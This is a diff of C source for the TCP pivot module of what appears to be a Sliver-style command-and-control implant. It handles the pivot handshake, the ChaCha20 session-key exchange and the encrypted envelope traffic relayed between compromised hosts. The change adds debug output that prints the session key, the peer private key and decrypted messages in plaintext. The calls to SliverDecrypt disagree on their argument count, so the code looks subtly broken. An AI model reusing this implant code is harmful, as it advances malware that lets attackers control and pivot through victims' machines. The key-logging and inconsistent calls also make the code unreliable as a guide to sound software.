@@ -186,7 +186,6 @@ BOOL TcpStart
 	PBUFFER pPeerPublicKeyRaw = NULL;
 	PPIVOT_HELLO RecvPivotHello = NULL;
 	PBUFFER pPeerSessionKey = NULL;
-	PPBElement MarshaledSessionKey = NULL;
 	PBYTE pEncryptedSessionKey = NULL;
 	DWORD cbEncryptedSessionKey = 0;
 	PPBElement PivotServerKeyExchange[2];
@@ -213,8 +212,6 @@ BOOL TcpStart
 	}
 
 	pPivotHello = MarshalPivotHello(pConfig, NULL);
-	PrintFormatA("pPivotHello:\n");
-	HexDump(pPivotHello->pBuffer, pPivotHello->cbBuffer);
 	if (!SocketSend(pSliverTcpClient, pPivotHello)) {
 		goto CLEANUP;
 	}
@@ -225,24 +222,22 @@ BOOL TcpStart
 	}
 
 	RecvPivotHello = UnmarshalPivotHello(pPeerPublicKeyRaw);
-	PrintFormatA("RecvPivotHello->pPublicKey: %s\n", RecvPivotHello->pPublicKey->pBuffer);
-	PrintFormatA("RecvPivotHello->lpPublicKeySignature: %s\n", RecvPivotHello->lpPublicKeySignature);
-	PrintFormatA("RecvPivotHello->pSessionKey:\n");
-	HexDump(RecvPivotHello->pSessionKey->pBuffer, RecvPivotHello->pSessionKey->cbBuffer);
 	pPeerSessionKey = AgeDecryptFromPeer(pConfig, RecvPivotHello->pPublicKey, RecvPivotHello->lpPublicKeySignature, RecvPivotHello->pSessionKey);
 	if (pPeerSessionKey == NULL || pPeerSessionKey->cbBuffer != CHACHA20_KEY_SIZE) {
 		goto CLEANUP;
 	}
 
-	PrintFormatA("pPeerSessionKey->pBuffer:\n");
-	HexDump(pPeerSessionKey->pBuffer, pPeerSessionKey->cbBuffer);
 	pConfig->pPeerSessionKey = pPeerSessionKey->pBuffer;
 	pPeerSessionKey->pBuffer = NULL;
 
 	// Server Key Exchange
 	pConfig->pSessionKey = GenRandomBytes(CHACHA20_KEY_SIZE);
-	MarshaledSessionKey = CreateBytesElement(pConfig->pSessionKey, CHACHA20_KEY_SIZE, 1);
-	pEncryptedSessionKey = AgeKeyExToServer(pConfig->lpRecipientPubKey, pConfig->lpPeerPrivKey, pConfig->lpPeerPubKey, MarshaledSessionKey->pMarshaledData, MarshaledSessionKey->cbMarshaledData, &cbEncryptedSessionKey);
+	PrintFormatA("pConfig->pSessionKey:\n");
+	HexDump(pConfig->pSessionKey, CHACHA20_KEY_SIZE);
+	PrintFormatA("pConfig->lpPeerPrivKey: %s\n", pConfig->lpPeerPrivKey);
+	pEncryptedSessionKey = AgeKeyExToServer(pConfig->lpRecipientPubKey, pConfig->lpPeerPrivKey, pConfig->lpPeerPubKey, pConfig->pSessionKey, CHACHA20_KEY_SIZE, &cbEncryptedSessionKey);
+	PrintFormatA("pEncryptedSessionKey:\n");
+	HexDump(pEncryptedSessionKey, cbEncryptedSessionKey);
 	PivotServerKeyExchange[0] = CreateVarIntElement(pConfig->uPeerID, 1);
 	PivotServerKeyExchange[1] = CreateBytesElement(pEncryptedSessionKey, cbEncryptedSessionKey, 2);
 	pPivotServerKeyExchangeData = CreateStructElement(PivotServerKeyExchange, _countof(PivotServerKeyExchange), 0);
@@ -293,7 +288,6 @@ CLEANUP:
 	FreeBuffer(pPeerSessionKey);
 	FreeBuffer(pPeerPublicKeyRaw);
 	FreePivotHello(RecvPivotHello);
-	FreeElement(MarshaledSessionKey);
 	FreeElement(pPivotServerKeyExchangeData);
 	FreeEnvelope(pEnvelope);
 	FreeBuffer(pPivotServerKeyExchangeEnvelope);
@@ -328,7 +322,11 @@ PENVELOPE TcpRecv
 	PPIVOT_PEER_ENVELOPE pPivotPeerEnvelope = NULL;
 
 	pCipherText = SocketRecv(pTcpClient);
-	pData = SliverDecrypt(pConfig, pCipherText, FALSE);
+	if (pCipherText == NULL) {
+		goto CLEANUP;
+	}
+
+	pData = SliverDecrypt(pConfig->pSessionKey, pCipherText);
 	if (pData == NULL) {
 		goto CLEANUP;
 	}
@@ -359,12 +357,14 @@ PENVELOPE TcpRecv
 		goto CLEANUP;
 	}
 
-	pPlainText = SliverDecrypt(pConfig, pPivotPeerEnvelope->pData, TRUE);
+	pPlainText = SliverDecrypt(pConfig->pSessionKey, pPivotPeerEnvelope->pData, TRUE);
 	if (pPlainText == NULL) {
 		goto CLEANUP;
 	}
 
 	pResult = UnmarshalEnvelope(pPlainText);
+	PrintFormatA("Read Envelope:\n");
+	HexDump(pResult->pData->pBuffer, pResult->pData->cbBuffer);
 CLEANUP:
 	FreeBuffer(pCipherText);
 	FreeBuffer(pData);
@@ -390,6 +390,8 @@ BOOL TcpSend
 	PPIVOT_PEER_ENVELOPE pPivotPeerEnvelope = NULL;
 	ENVELOPE FinalEnvelope;
 
+	PrintFormatA("Write Envelope:\n");
+	HexDump(pEnvelope->pData->pBuffer, pEnvelope->pData->cbBuffer);
 	pPlainText = MarshalEnvelope(pEnvelope);
 	if (pEnvelope->uType != MsgPivotPeerPing && pEnvelope->uType != MsgPivotPeerEnvelope) {
 		pPivotPeerEnvelope = ALLOC(sizeof(PIVOT_PEER_ENVELOPE));
